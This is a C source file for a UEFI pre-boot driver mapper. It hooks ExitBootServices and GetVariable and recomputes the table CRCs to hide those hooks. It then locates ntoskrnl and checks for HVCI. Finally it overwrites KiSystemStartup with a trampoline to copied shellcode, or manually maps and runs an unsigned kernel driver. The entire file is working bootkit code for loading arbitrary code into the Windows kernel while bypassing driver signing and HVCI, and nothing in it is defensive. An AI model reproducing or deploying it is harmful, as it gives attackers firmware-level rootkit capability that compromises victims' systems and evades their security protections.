#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include "othrys_types.h"
#include "peimage.h"
#include "shellcode.h"

#define KERNEL_ALLOC_SIZE  0x10000
#define PATCH_SIZE         14
#define POOL_FLAG_NON_PAGED 0x00000000

typedef struct {
    UINT64 ExAllocatePool2;
    UINT64 ExAllocatePoolWithTag;
    UINT64 ExFreePoolWithTag;
    UINT64 PsLoadedModuleList;
    UINT64 PsSetLoadImageNotifyRoutine;
    UINT64 IoGetDeviceObjectPointer;
    UINT64 ObReferenceObjectByName;
    UINT64 KeGetEffectiveIrql;
    UINT64 KiSystemStartup;
    UINT64 NtoskrnlBase;
    UINT64 NtoskrnlSize;
} NTOSKRNL_OFFSETS;

typedef UINT64 (*PFN_ExAllocatePool2)(UINT32 Flags, UINTN Size, UINT32 Tag);
typedef UINT64 (*PFN_ExAllocatePoolWithTag)(UINT32 PoolType, UINTN NumberOfBytes, UINT32 Tag);
typedef VOID (*PFN_ExFreePoolWithTag)(VOID *P, UINT32 Tag);
typedef NTSTATUS (*PFN_DriverEntry)(VOID *DriverObject, VOID *RegistryPath);

extern EFI_STATUS ResolveNtoskrnlOffsets(NTOSKRNL_OFFSETS *Out);
extern BOOLEAN DetectHvci(UINT64 NtoskrnlBase);
extern UINT64 FindCodeCave(UINT64 Base, UINT64 Size, UINTN RequiredSize);
extern UINT64 FindKiSystemStartup(UINT64);
extern UINT64 FindNtoskrnlBase(VOID);

extern EFI_STATUS EfiLoadDriver(VOID *RawDriver, UINTN RawSize,
    UINT64 NtoskrnlBase, UINT64 PsLoadedModuleList,
    EFI_PE_MAPPED_IMAGE *Out);

typedef struct {
    UINT64 MarkerStart;
    UINT64 DriverDataBase;
    UINT64 DriverDataSize;
    UINT64 DriverEntry;
    UINT64 NtoskrnlBase;
    UINT64 ExAllocatePool2Addr;
    UINT64 ExAllocatePoolWithTagAddr;
    UINT64 PsLoadedModuleListAddr;
    UINT64 OriginalReturnAddr;
    UINT8  SavedBytes[16];
    UINT64 PatchAddress;
    UINT64 MarkerEnd;
} HVCI_SHELLCODE_CTX;

static EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;
static EFI_GET_VARIABLE OriginalGetVariable = NULL;
static VOID *gDriverData = NULL;
static UINT64 gDriverSize = 0;
static volatile SHELLCODE_HEADER *gShellcodeCtx = NULL;
static volatile HVCI_SHELLCODE_CTX *gHvciCtx = NULL;
static EFI_PE_MAPPED_IMAGE gHvciMappedDriver;
static BOOLEAN gHvciInjectionDone = FALSE;

static UINT8 gSavedBytes[16] = {0};
static UINT64 gPatchAddress = 0;

static VOID
InstallTrampoline (
    UINT64 PatchAddress,
    UINT64 TargetAddress
)
{
    UINT8 Trampoline[14];
    Trampoline[0] = 0x48; 
    Trampoline[1] = 0xB8;
    *(UINT64 *)(Trampoline + 2) = TargetAddress;
    Trampoline[10] = 0xFF; 
    Trampoline[11] = 0xE0;
    Trampoline[12] = 0xCC;
    Trampoline[13] = 0xCC;

    CopyMem(gSavedBytes, (VOID *)PatchAddress, 14);
    gPatchAddress = PatchAddress;

    CopyMem((VOID *)PatchAddress, Trampoline, 14);
}

static EFI_STATUS
InstallNonHvciMapper (
    NTOSKRNL_OFFSETS *Offsets,
    VOID *DriverData,
    UINT64 DriverSize
)
{
    UINT64 CodeCave;
    UINT8 *ShellcodeCopy;
    UINTN Pages;
    EFI_PHYSICAL_ADDRESS ShellcodeAddr;
    EFI_STATUS Status;

    CodeCave = FindCodeCave(Offsets->NtoskrnlBase, KERNEL_ALLOC_SIZE, 0x300);
    if (!CodeCave) return EFI_NOT_FOUND;

    Pages = EFI_SIZE_TO_PAGES(0x1000);
    Status = gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesCode,
        Pages, &ShellcodeAddr);
    if (EFI_ERROR(Status)) return Status;

    ShellcodeCopy = (UINT8 *)ShellcodeAddr;

    extern UINT32 GetShellcodeSize(VOID);
    extern UINT32 GetShellcodeOffset(VOID);

    UINT32 ScSize = GetShellcodeSize();
    UINT32 ScOffset = GetShellcodeOffset();

    UINT8 *ShellcodeSrc = (UINT8 *)((UINTN)&ShellcodeEntry + ScOffset);
    CopyMem(ShellcodeCopy, ShellcodeSrc, ScSize);

    gShellcodeCtx = (volatile SHELLCODE_HEADER *)ShellcodeCopy;
    gShellcodeCtx->MarkerStart = SHELLCODE_MARKER_START;
    gShellcodeCtx->MarkerEnd = SHELLCODE_MARKER_END;
    gShellcodeCtx->DriverDataAddr = (UINT64)DriverData;
    gShellcodeCtx->DriverSize = DriverSize;
    gShellcodeCtx->NtoskrnlBase = Offsets->NtoskrnlBase;
    gShellcodeCtx->ExAllocatePool2Addr = Offsets->ExAllocatePool2;
    gShellcodeCtx->ExAllocatePoolWithTagAddr = Offsets->ExAllocatePoolWithTag;
    gShellcodeCtx->PsLoadedModuleListAddr = Offsets->PsLoadedModuleList;

    UINT64 KiSystemStartup = Offsets->KiSystemStartup;
    if (!KiSystemStartup) KiSystemStartup = FindKiSystemStartup(Offsets->NtoskrnlBase);
    if (!KiSystemStartup) return EFI_NOT_FOUND;

    InstallTrampoline(KiSystemStartup, (UINT64)ShellcodeCopy);

    return EFI_SUCCESS;
}

static BOOLEAN
CheckKernelReadyHvci (
    UINT64 PsLoadedModuleList
)
{
    if (!PsLoadedModuleList) return FALSE;
    UINT64 Flink = *(UINT64 *)PsLoadedModuleList;
    if (Flink == 0 || Flink == PsLoadedModuleList) return FALSE;
    return TRUE;
}

static EFI_STATUS
EFIAPI
HookedGetVariableHvci (
    IN     CHAR16    *VariableName,
    IN     EFI_GUID  *VendorGuid,
    OUT    UINT32    *Attributes OPTIONAL,
    IN OUT UINTN     *DataSize,
    OUT    VOID      *Data OPTIONAL
)
{
    EFI_STATUS Status = OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);

    if (!gHvciInjectionDone && CheckKernelReadyHvci(gHvciCtx->PsLoadedModuleListAddr)) {
        
        for (volatile UINTN i = 0; i < 1000000; i++);

        if (CheckKernelReadyHvci(gHvciCtx->PsLoadedModuleListAddr)) {
            PFN_DriverEntry DriverEntry = (PFN_DriverEntry)gHvciCtx->DriverEntry;
            if (DriverEntry) {
                DriverEntry(NULL, NULL);
            }
            gHvciInjectionDone = TRUE;

            gRT->GetVariable = OriginalGetVariable;
            gRT->Hdr.CRC32 = 0;
            gBS->CalculateCrc32(&gRT->Hdr, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);
        }
    }

    return Status;
}

static EFI_STATUS
InstallHvciMapper (
    NTOSKRNL_OFFSETS *Offsets,
    VOID *DriverData,
    UINT64 DriverSize
)
{
    EFI_STATUS Status;
    UINT8 *ShellcodeBuf;
    UINTN Pages;
    EFI_PHYSICAL_ADDRESS ShellcodeAddr;

    Status = EfiLoadDriver(
        DriverData,
        (UINTN)DriverSize,
        Offsets->NtoskrnlBase,
        Offsets->PsLoadedModuleList,
        &gHvciMappedDriver
    );
    if (EFI_ERROR(Status)) return Status;

    Pages = EFI_SIZE_TO_PAGES(0x1000);
    Status = gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesCode,
        Pages, &ShellcodeAddr);
    if (EFI_ERROR(Status)) return Status;

    ShellcodeBuf = (UINT8 *)ShellcodeAddr;

    gHvciCtx = (volatile HVCI_SHELLCODE_CTX *)ShellcodeBuf;
    gHvciCtx->MarkerStart = SHELLCODE_MARKER_START;
    gHvciCtx->MarkerEnd = SHELLCODE_MARKER_END;
    gHvciCtx->DriverDataBase = (UINT64)gHvciMappedDriver.CodeBase;
    gHvciCtx->DriverDataSize = gHvciMappedDriver.CodeSize;
    gHvciCtx->DriverEntry = gHvciMappedDriver.EntryPoint;
    gHvciCtx->NtoskrnlBase = Offsets->NtoskrnlBase;
    gHvciCtx->ExAllocatePool2Addr = Offsets->ExAllocatePool2;
    gHvciCtx->ExAllocatePoolWithTagAddr = Offsets->ExAllocatePoolWithTag;
    gHvciCtx->PsLoadedModuleListAddr = Offsets->PsLoadedModuleList;

    OriginalGetVariable = gRT->GetVariable;
    gRT->GetVariable = HookedGetVariableHvci;
    gRT->Hdr.CRC32 = 0;
    gBS->CalculateCrc32(&gRT->Hdr, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);

    return EFI_SUCCESS;
}

static EFI_STATUS
EFIAPI
HookedExitBootServices (
    EFI_HANDLE  ImageHandle,
    UINTN       MapKey
)
{
    EFI_STATUS Status;
    NTOSKRNL_OFFSETS Offsets;
    BOOLEAN HvciActive;

    Status = OriginalExitBootServices(ImageHandle, MapKey);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Status = ResolveNtoskrnlOffsets(&Offsets);
    if (EFI_ERROR(Status)) return EFI_SUCCESS;

    HvciActive = DetectHvci(Offsets.NtoskrnlBase);

    if (HvciActive) {
        InstallHvciMapper(&Offsets, gDriverData, gDriverSize);
    } else {
        InstallNonHvciMapper(&Offsets, gDriverData, gDriverSize);
    }

    return EFI_SUCCESS;
}

EFI_STATUS
InstallMapperHook (
    VOID *DriverData,
    UINT64 DriverSize
)
{
    gDriverData = AllocateRuntimePool((UINTN)DriverSize);
    if (!gDriverData) return EFI_OUT_OF_RESOURCES;
    CopyMem(gDriverData, DriverData, (UINTN)DriverSize);
    gDriverSize = DriverSize;

    OriginalExitBootServices = gBS->ExitBootServices;
    gBS->ExitBootServices = HookedExitBootServices;

    gBS->Hdr.CRC32 = 0;
    gBS->CalculateCrc32(&gBS->Hdr, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

    return EFI_SUCCESS;
}